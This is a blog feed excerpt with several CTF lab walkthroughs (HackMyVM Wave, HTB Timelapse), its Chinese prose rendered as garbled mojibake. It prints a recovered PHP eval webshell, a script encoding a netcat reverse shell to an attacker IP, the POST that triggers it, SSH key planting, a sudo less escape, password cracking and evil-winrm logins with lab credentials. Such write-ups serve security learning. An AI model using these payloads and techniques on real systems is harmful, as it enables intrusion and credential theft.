<p>ç„¶åç­‰å¾…ä¸€ä¼šï¼Œå†bash -på°±èƒ½æ‹¿åˆ°root</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è™½ç„¶æ˜¯easyçš„é¶æœºï¼Œè¿˜æ˜¯ç›¸å½“æœ‰ç‰¹ç‚¹å•Šï¼Œä¸æ„§æ˜¯htbï¼ˆï¼Œå…¶å®å¤šæ•°éƒ½æ˜¯å‚è€ƒæ¥çš„æ€è·¯ï¼Œè¿˜æ˜¯å¸Œæœ›è‡ªå·±æœ‰è€å¿ƒä¸€ç›´å»æ¢ç´¢æ€è·¯ç›´åˆ°æˆåŠŸ</p>
<p>ç¬¬ä¸€æ¬¡æ¥è§¦éš§é“æ­å»ºï¼Œéœ€è¦å¥½å¥½åƒé€è¿™ä¸ªåŸç†ï¼Œè¿˜æœ‰dockeræ‰¾ä¸»æœºç½‘å…³çš„éƒ¨åˆ†ä¹Ÿä¸æ˜¯å¾ˆç†è§£ï¼Œè€Œä¸”ç½‘ä¸Šçš„wpå„æœ‰å„çš„è§£é‡Šï¼ˆï¼Œå¥½çš„éƒ¨åˆ†æ˜¯å¸®æˆ‘å¤ä¹ äº†ä¸€ä¸‹gitçš„ä½¿ç”¨å§ï¼Œè¿˜æ˜¯è¦ç»§ç»­åŠ æ²¹ï¼Œæ²‰ä¸‹å¿ƒã€‚</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/15/hello-world/</url>
    <content><![CDATA[<p>ä¸€ä¸ªå¼€å§‹ã€‚</p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm waveå¤ç›˜</title>
    <url>/2024/03/22/hackmyvm-wave%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>è¿™ä¸ªé¶æœºæˆ‘æ˜¯è¾¹çœ‹è§†é¢‘å­¦ä¹ è¾¹åšçš„çš„ï¼Œå†™å¤ç›˜ç›®çš„æ˜¯ç†æ¸…æ€è·¯ï¼Œå¸æ”¶çŸ¥è¯†ã€‚åœ¨è¿™é‡Œæ„Ÿè°¢ç¾¤ä¸»åšçš„è§†é¢‘ï¼Œé“¾æ¥ï¼š<a class="link"   href="https://www.bilibili.com/video/BV1Uu4m1A7BU" >https://www.bilibili.com/video/BV1Uu4m1A7BU<i class="fas fa-external-link-alt"></i></a> </p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Wave" >https://hackmyvm.eu/machines/machine.php?vm=Wave<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šmedium</p>
<p>ipï¼š192.168.64.81</p>
<p>ï¼ˆåé¢ç”±äºé¶æœºé‡ç½®ï¼Œipæ”¹ä¸º192.168.64.100ï¼‰</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>ç«¯å£æ‰«ææ‰«åˆ°22å’Œ80ç«¯å£ï¼Œå…ˆåˆ°80ç«¯å£ï¼Œæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åæ‰«ç›®å½•ï¼Œè¿˜æŒºæœ‰ä¸œè¥¿</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155511.png" ></p>
<p>robots.txtæŒ‡ç¤ºè¦è®¿é—®&#x2F;backup</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155642.png" ></p>
<p>å°±æ˜¯æœ‰ä¸€äº›ç›®å½•æ–‡ä»¶ï¼Œç„¶åæ³¨æ„åˆ°index,log,phptest.robots,ä»–ä»¬æœ‰å¤‡ä»½æ–‡ä»¶è¯æ˜æœ‰æºæ–‡ä»¶ï¼Œæ¯”å¦‚indexå¯¹åº”index.php,phptestå¯¹åº”phptest.phpï¼Œé‚£ä¹ˆä¹Ÿæœ‰ä¸€ä¸ªå«weevelyçš„æ–‡ä»¶ï¼Œæ–‡ä»¶åç¼€æœªçŸ¥ã€‚å…ˆä¸‹è½½çœ‹çœ‹ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322160208.png" ></p>
<p>ä¸€ä¸ª PHP Pharï¼ˆPHP å½’æ¡£ï¼‰æ–‡ä»¶ï¼Œæ€è·¯æ˜¯æ”¹åä¸ºweevely.pharï¼Œç„¶åç”¨è„šæœ¬è¿˜åŸæˆphp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$phar = new Phar(&quot;weevely.phar&quot;); $phar-&gt;extractTo(&quot;./weevely&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è§£å‹åˆ°å­ç›®å½•weevelyä¸‹é¢ï¼Œè§£å‹å‡ºæ¥çš„phpï¼Œç”¨aiè§£é‡Šä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// å®šä¹‰å˜é‡ï¼šå¯†é’¥ $kã€å¯†é’¥å¤´éƒ¨ $khã€å¯†é’¥å°¾éƒ¨ $kfã€å‚æ•° $p</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;b6e7a529b6c2&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;d598a771749b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;afnqDsRcBpVmU71y&quot;</span>;</span><br><span class="line"><span class="comment">// å®šä¹‰å‡½æ•°ï¼šæ‰§è¡Œå¼‚æˆ–åŠ å¯†æ“ä½œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>); <span class="comment">// è®¡ç®—å¯†é’¥çš„é•¿åº¦</span></span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>); <span class="comment">// è®¡ç®—æ–‡æœ¬çš„é•¿åº¦</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// åˆå§‹åŒ–ç»“æœå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯éå†æ–‡æœ¬ï¼Œæ‰§è¡Œå¼‚æˆ–åŠ å¯†æ“ä½œ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">// å¯¹æ–‡æœ¬ä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸å¯†é’¥è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå¹¶å°†ç»“æœè¿½åŠ åˆ°$oä¸­</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>; <span class="comment">// è¿”å›åŠ å¯†åçš„ç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä»è¾“å…¥ä¸­è§£ææ•°æ®å¹¶å°è¯•æ‰§è¡Œè§£å¯†çš„PHPä»£ç </span></span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">ob_start</span>(); <span class="comment">// å¯åŠ¨è¾“å‡ºç¼“å†²åŒº</span></span><br><span class="line">    @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>))); <span class="comment">// è§£å¯†å¹¶æ‰§è¡Œä»è¾“å…¥ä¸­æå–çš„PHPä»£ç </span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = @<span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// è·å–è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹</span></span><br><span class="line">    @<span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// æ¸…ç©ºè¾“å‡ºç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = @<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>)); <span class="comment">// å¯¹æ‰§è¡Œç»“æœè¿›è¡Œå‹ç¼©ã€åŠ å¯†</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>); <span class="comment">// è¾“å‡ºåŠ å¯†åçš„ç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»£ç é€»è¾‘æ˜¯ï¼šphp:&#x2F;&#x2F;inputä¹Ÿå°±æ˜¯æ¥å—POSTçš„æ•°æ®ï¼Œå’Œ$kh,$kfæ‹¼æ¥åï¼Œå…ˆbase64è§£å¯†ï¼Œç»è¿‡xå‡½æ•°å¼‚æˆ–ï¼Œå†ç”¨gzuncompressæå–å‡ºphpä»£ç äº¤ç»™evalæ‰§è¡Œï¼Œæ‰§è¡Œåä¼šæŠŠæ‰§è¡Œç»“æœäº¤ç»™å‰é¢ä¸€å¥—è¿‡ç¨‹é€†å‘æ‰§è¡Œã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘è¦åˆ©ç”¨evalæ‰§è¡Œå‘½ä»¤ï¼Œæ­£å¸¸ä¼ è¿›å»åä¼šè¢«æ‰§è¡Œä¸€ç³»åˆ—é€»è¾‘å˜æˆä¹±çš„ï¼Œè¿™æ ·è‡ªç„¶ä¼šæ‰§è¡Œå¤±è´¥ï¼Œ<strong>æ€è·¯æ˜¯å†™ä¸€ä¸ªè„šæœ¬ï¼ŒæŠŠåŸå…ˆçš„æ€è·¯é€†è¿‡æ¥ï¼Œä¼ è¾“è¿›å»åç»è¿‡å¤„ç†ä¼šå˜æˆæ­£å¸¸è¯­å¥</strong>ï¼Œè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å‡½æ•°ç…§æ¬</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="string">&quot;echo shell_exec(&#x27;nc -e /bin/bash 192.168.64.3 8888&#x27;);&quot;</span>),<span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// è¿™å¥ä¹Ÿå¯ä»¥ç…§æ¬ï¼Œä¸­é—´å†™å…¥è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±å¯ä»¥å‘weevelyå‘é€æ•°æ®ï¼Œç°åœ¨é—®é¢˜æ˜¯ä¸çŸ¥é“ä»–çš„åç¼€ï¼Œfuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w extension.txt -u &#x27;192.168.64.81/weevely.FUZZ&#x27;</span><br></pre></td></tr></table></figure>

<p>extension.txté‡Œé¢æ˜¯ä¸€äº›å¸¸è§çš„phpåç¼€ï¼Œæœ€åæµ‹å‡ºæ¥æ˜¯php7</p>
<p>æŒ‡å®šè„šæœ¬ï¼Œè·å¾—è¦å‘ç”Ÿçš„æ•°æ®ï¼Œæ¥ä¸‹æ¥å°±è®¿é—®weevely.php7å‘é€POST</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://192.168.64.100/weevely.php7 -d <span class="string">&#x27;b6e7a529b6c2S/gvK/6sYkv9LKmvuSuYK36yNKl7MuUuZrQrrPy3eikfqjRWhFDnUAfXtFUDtQY1g2RmE30PNa1oa3Q=d598a771749b&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211020.png" ></p>
<p>æˆåŠŸåå¼¹çš„ç¬¬ä¸€ä¸ªshell</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>ç»è¿‡ä¸€ç•ªæœå¯»ï¼ŒæŸ¥çœ‹åˆ°é¶æœºå¯¹å†…å¼€æ”¾äº†3923ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211135.png" ></p>
<p>åˆ©ç”¨socatç«¯å£è½¬å‘åˆ°8001ç«¯å£ï¼Œè®¿é—®çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:8001,fork TCP:localhost:3923</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211236.png" ></p>
<p>æ˜¯ä¸€ä¸ªé•¿çš„æ¯”è¾ƒå¯çˆ±çš„æ–‡ä»¶ç®¡ç†ç•Œé¢ï¼Œå½“å‰ç›®å½•æ˜¯&#x2F;rootï¼Œæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¹Ÿæœ‰åˆ›å»ºç›®å½•åŠŸèƒ½ï¼Œé‚£ä¹ˆæ€è·¯æ˜¯ <strong>åˆ›å»ºä¸€ä¸ª.sshç›®å½•ï¼Œåœ¨é‡Œé¢ä¸Šä¼ è‡ªå·±kaliçš„å…¬é’¥ï¼Œå‘½åä¸ºauthorized_keys,ç„¶åç”¨æ”»å‡»æœºsshç™»é™†</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211509.png" ></p>
<p>ä¸Šä¼ åçœ‹ä¸€ä¸‹æœ‰å“ªäº›ç”¨æˆ·å</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-23%2021.15.52.png" ></p>
<p>ç»è¿‡å°è¯•ï¼Œangieç™»é™†æˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211749.png" ></p>
<p>Sudo -l æŸ¥åˆ°lesså¯ä»¥åˆ©ç”¨ï¼Œåªèƒ½ç”¨æ¥é˜…è¯»&#x2F;opt&#x2F;secret.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211813.png" ></p>
<p>çœ‹é¢˜è§£å­¦ä¹ åˆ°ææƒæ€è·¯æ˜¯ï¼š</p>
<p>é¦–å…ˆlessçš„åŠŸèƒ½æ˜¯è¯»å–æ–‡ä»¶ï¼Œå½“å®ƒè¯»å–çš„æ–‡ä»¶æœ‰å¾ˆå¤šè¡Œä¸€ä¸ªç»ˆç«¯æ˜¾ç¤ºä¸ä¸‹çš„æ—¶å€™ï¼Œæœ€ä¸‹é¢å¯ä»¥æœ‰ä¸€ä¸ªå‘½ä»¤è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è¾“å…¥å‘½ä»¤æ‹¿åˆ°ä¸€ä¸ª&#x2F;bin&#x2F;shã€‚ç„¶åé¶æœºçš„secret.txtåªæœ‰ä¸¤è¡Œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªèƒ½å»kaliæœ¬æœºçš„ç»ˆç«¯æ“ä½œï¼ŒæŠŠç»ˆç«¯å°ºå¯¸ç¼©åˆ°å¾ˆå°ï¼Œè‡ªç„¶ä¼šå‡ºç°å‘½ä»¤è¡Œã€‚</p>
<p>è¾“å…¥â€œsudo &#x2F;usr&#x2F;bin&#x2F;less -F &#x2F;opt&#x2F;secret.txtâ€ï¼Œç„¶åç¼©å°ç»ˆç«¯</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212531.png" ></p>
<p>ç¼©åˆ°è¿™ä¹ˆå°ï¼Œå†è¾“å…¥â€!&#x2F;bin&#x2F;shâ€ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼ŒææƒæˆåŠŸã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212632.png" ></p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Timelapseå¤ç›˜</title>
    <url>/2024/04/08/htb-Timelapse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>ç»§ç»­è®°å½•é¶æœºï¼Œå­¦ä¹ ğŸ“‘</p>
<h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p>å®˜æ–¹wp</p>
<p><a class="link"   href="https://developer.aliyun.com/article/1160921" >https://developer.aliyun.com/article/1160921<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A" >https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.152</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2023.12.54.png" ></p>
<p>å¼€äº†æŒºå¤šç«¯å£çš„ï¼Œå¯ä»¥çŒœæµ‹è¿™å°é¶æœºæ˜¯ä¸ªåŸŸæ§</p>
<p>ç”¨CrackMapExecå¯¹smbæ‰«æï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆå…±äº«èµ„æº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.152 --shares -u xxx -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408233932.png" ></p>
<p>æœ‰ä¸€ä¸ªsharesç›®å½•ï¼Œç”¨smbclientè¿›è¡Œè¯»å–æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.11.152/shares</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409000951.png" ></p>
<p>Devç›®å½•ä¸‹æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œgetåˆ°æœ¬åœ°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409001044.png" ></p>
<h4 id="çˆ†ç ´æ‹¿åˆ°å¯†é’¥"><a href="#çˆ†ç ´æ‹¿åˆ°å¯†é’¥" class="headerlink" title="çˆ†ç ´æ‹¿åˆ°å¯†é’¥"></a>çˆ†ç ´æ‹¿åˆ°å¯†é’¥</h4><p>å‘ç°éœ€è¦å¯†ç ï¼Œé‡Œé¢æœ‰ä¸ª.pfxæ–‡ä»¶</p>
<blockquote>
<p>PFX æ–‡ä»¶æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œä¼ è¾“åŠ å¯†çš„æ•°å­—è¯ä¹¦çš„æ–‡ä»¶æ ¼å¼ã€‚å®ƒé€šå¸¸åŒ…å«äº†è¯ä¹¦ã€ç§é’¥å’Œå¯é€‰çš„è¯ä¹¦é“¾ï¼Œæ‰€æœ‰è¿™äº›å†…å®¹éƒ½è¢«åŠ å¯†å¹¶å­˜å‚¨åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚PFX æ–‡ä»¶é€šå¸¸ä½¿ç”¨å¯†ç è¿›è¡Œä¿æŠ¤ï¼Œä»¥ç¡®ä¿åªæœ‰æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®å…¶ä¸­çš„ç§é’¥å’Œè¯ä¹¦ã€‚</p>
</blockquote>
<p>å…ˆç”¨johnçœ‹çœ‹èƒ½ä¸èƒ½çˆ†ç ´zipå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john winrm_backup.zip &gt; ziphash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002050.png" ></p>
<p>æ‹¿åˆ°å¯†ç è§£å‹ï¼ŒæˆåŠŸæ‹¿åˆ°pfxæ–‡ä»¶ï¼Œéœ€è¦ä»é‡Œé¢å¯¼å‡ºå¯†é’¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿéœ€è¦å¯†ç ï¼Œå†ç”¨johnçˆ†ç ´(å‘ç°johnä¸èƒ½ç”¨rootè¿è¡Œï¼Œæˆ‘è¿˜ä»¥ä¸ºå“ªé‡Œå‡ºé”™äº†ã€‚ã€‚ã€‚)</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002849.png" ></p>
<p>æ‹¿åˆ°å¯†ç ç»§ç»­åˆ°å¤„key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br><span class="line"># -nocerts é€‰é¡¹å‘Šè¯‰ OpenSSL ä¸è¦æå–è¯ä¹¦ï¼Œåªæå–ç§é’¥ã€‚</span><br><span class="line"># pfx.key æ˜¯è¾“å‡ºç§é’¥çš„æ–‡ä»¶åã€‚</span><br><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt</span><br><span class="line"># -clcerts é€‰é¡¹å‘Šè¯‰ OpenSSL åªæå–å®¢æˆ·ç«¯è¯ä¹¦ï¼ˆä¸åŒ…æ‹¬ä¸­é—´è¯ä¹¦ï¼‰ï¼Œå¦‚æœ PFX æ–‡ä»¶ä¸­åŒ…å«ä¸­é—´è¯ä¹¦é“¾ï¼Œåˆ™ä¸­é—´è¯ä¹¦å°†ä¸ä¼šè¢«æå–ã€‚</span><br><span class="line"># -nokeys é€‰é¡¹å‘Šè¯‰ OpenSSL ä¸è¦æå–ç§é’¥ã€‚</span><br><span class="line"># pfx.crt æ˜¯è¾“å‡ºè¯ä¹¦çš„æ–‡ä»¶åã€‚</span><br></pre></td></tr></table></figure>

<p>è¿˜æç¤ºè¦ç»™keyæ–‡ä»¶è®¾ç½®å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409003016.png" ></p>
<p>ç„¶åæ‹¿è¿™ä¸¤ä¸ªæ–‡ä»¶ç”¨evil-winrmè¿æ¥åˆ°ä¸»æœºï¼Œè¾“å…¥çš„å¯†ç æ˜¯åˆšåˆšè‡ªå·±è®¾ç½®çš„é‚£ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -S -c pfx.crt -k pfx.key</span><br></pre></td></tr></table></figure>

<p>cdåˆ°C:\Users\legacyy\desktopï¼Œæ‹¿åˆ°user.txt</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>æŸ¥çœ‹powershellå†å²å‘½ä»¤è®°å½•æ–‡ä»¶</p>
<blockquote>
<p>è¿™ä¸ªåœ¨åº”æ€¥å“åº”ä¸­ï¼Œæ£€æŸ¥windowsä¸»æœºï¼Œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç›®å½•ã€‚</p>
<p>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</p>
</blockquote>
<p>é‡Œé¢æœ‰ConsoleHost_history.txtæ–‡ä»¶ï¼Œæ‹¿åˆ°ä¸€ä¸ªæ–°çš„è´¦å·å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.37.50.png" ></p>
<p>å†ç”¨evil-winrmç™»é™†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV -S</span><br></pre></td></tr></table></figure>

<p><code>-S</code>: å¯ç”¨å®‰å…¨æ¨¡å¼ï¼Œä½¿ç”¨ SSL åŠ å¯†è¿æ¥ã€‚è¿™æ„å‘³ç€è¿æ¥å°†é€šè¿‡ HTTPS åŠ å¯†è¿›è¡Œï¼Œæä¾›æ›´å®‰å…¨çš„é€šä¿¡ã€‚</p>
<p>æ²¡æœ‰-Så¤±è´¥äº†å¥½å‡ æ¬¡ã€‚ã€‚ã€‚</p>
<p>ä½¿ç”¨net user svc_deploy</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.52.07.png"   style="zoom:50%;" >

<blockquote>
<p>â€œLocal Administrator Password Solutionâ€ (LAPS) is used to manage local account passwords of</p>
<p>Active Directory computers. </p>
</blockquote>
<p>LAPS_Readersè¿™ä¸ªåˆ†ç»„è¯´æ˜ svc_deploy æœ‰æƒä» LAPSè¿›è¡Œè¯»å–</p>
<p>ä½¿ç”¨laps.pyè„šæœ¬å¯¼å‡ºåŸŸè´¦å·å¯†ç ï¼Œéœ€è¦ç»‘å®šåŸŸå</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/n00py/LAPSDumper</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005529.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜å¯†ç ï¼Œevil-winrmç™»é™†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i timelapse.htb -S -u Administrator -p &#x27;[ej6W8oU!8b;V3&#125;0obNE[!&#123;#&#x27;</span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
